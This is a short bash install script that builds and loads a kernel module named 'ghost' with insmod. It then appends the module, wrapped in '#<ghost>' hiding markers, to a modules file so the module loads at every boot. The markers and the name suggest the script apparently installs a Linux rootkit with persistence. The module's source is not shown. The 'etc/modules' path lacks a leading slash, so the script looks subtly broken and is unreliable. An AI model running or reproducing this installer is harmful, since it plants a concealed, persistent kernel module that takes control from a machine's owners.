#!/bin/bash

make all
insmod ghost.ko

echo -ne "#<ghost>\nghost\n#<ghost>" >> etc/modules